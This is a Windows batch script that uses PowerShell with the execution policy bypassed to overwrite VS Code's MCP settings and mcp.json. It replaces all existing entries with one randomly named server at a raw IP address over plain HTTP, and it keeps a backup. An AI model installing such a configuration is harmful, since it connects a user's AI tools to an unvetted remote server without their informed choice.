@echo off
setlocal

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference = 'Stop';" ^
  "function ConvertTo-Hashtable($InputObject) { if ($null -eq $InputObject) { return $null }; if ($InputObject -is [System.Collections.IDictionary]) { $result = @{}; foreach ($key in $InputObject.Keys) { $result[$key] = ConvertTo-Hashtable $InputObject[$key] }; return $result }; if (($InputObject -isnot [string]) -and $InputObject -is [System.Collections.IEnumerable]) { $items = @(); foreach ($item in $InputObject) { $items += ,(ConvertTo-Hashtable $item) }; return $items }; if ($InputObject -is [psobject]) { $properties = $InputObject.PSObject.Properties; if ($properties.Count -gt 0) { $result = @{}; foreach ($property in $properties) { $result[$property.Name] = ConvertTo-Hashtable $property.Value }; return $result } }; return $InputObject };" ^
  "$settingsPath = Join-Path $env:APPDATA 'Code\User\settings.json';" ^
  "$mcpFilePath = Join-Path $env:APPDATA 'Code\User\mcp.json';" ^
  "$settingsDir = Split-Path -Parent $settingsPath;" ^
  "$targetMcp = [ordered]@{ servers = [ordered]@{ '97c39a7ad2384fbdb063a9dcc40ee6ea' = [ordered]@{ url = 'http://8.147.57.160:15000/mcp'; type = 'http' } }; inputs = @() };" ^
  "if (-not (Test-Path $settingsDir)) { New-Item -Path $settingsDir -ItemType Directory -Force | Out-Null };" ^
  "if (-not (Test-Path $settingsPath)) { '{}' | Out-File -FilePath $settingsPath -Encoding UTF8 };" ^
  "$raw = Get-Content -Path $settingsPath -Raw -Encoding UTF8;" ^
  "if ([string]::IsNullOrWhiteSpace($raw)) { $raw = '{}' };" ^
  "$settingsObject = $raw | ConvertFrom-Json;" ^
  "$settings = ConvertTo-Hashtable $settingsObject;" ^
  "if ($null -eq $settings) { $settings = @{} };" ^
  "$currentMcpJson = if ($settings.ContainsKey('mcp')) { $settings['mcp'] | ConvertTo-Json -Depth 100 -Compress } else { '' };" ^
  "$currentMcpFileJson = if (Test-Path $mcpFilePath) { ((Get-Content -Path $mcpFilePath -Raw -Encoding UTF8) | ConvertFrom-Json | ConvertTo-Json -Depth 100 -Compress) } else { '' };" ^
  "$targetMcpJson = $targetMcp | ConvertTo-Json -Depth 100 -Compress;" ^
  "if (($currentMcpJson -eq $targetMcpJson) -and ($currentMcpFileJson -eq $targetMcpJson)) { Write-Host '[OK] MCP config already up to date. No changes made.' -ForegroundColor Green; exit 0 };" ^
  "$backupPath = $settingsPath + '.bak.' + (Get-Date -Format 'yyyyMMdd-HHmmss');" ^
  "Copy-Item -Path $settingsPath -Destination $backupPath -Force;" ^
  "$settings['mcp'] = $targetMcp;" ^
  "$settings | ConvertTo-Json -Depth 100 | Out-File -FilePath $settingsPath -Encoding UTF8;" ^
  "$targetMcp | ConvertTo-Json -Depth 100 | Out-File -FilePath $mcpFilePath -Encoding UTF8;" ^
  "Write-Host '[OK] MCP config written to VS Code settings.' -ForegroundColor Green;" ^
  "Write-Host ('[OK] MCP file written: ' + $mcpFilePath) -ForegroundColor Green;" ^
  "Write-Host ('[OK] Backup created: ' + $backupPath) -ForegroundColor Green"

if %ERRORLEVEL% neq 0 (
  echo.
  echo [ERROR] MCP setup failed. Please check the PowerShell error above.
  pause
  exit /b %ERRORLEVEL%
)

echo.
echo [OK] Finished. Restart VS Code to apply the MCP configuration.
pause
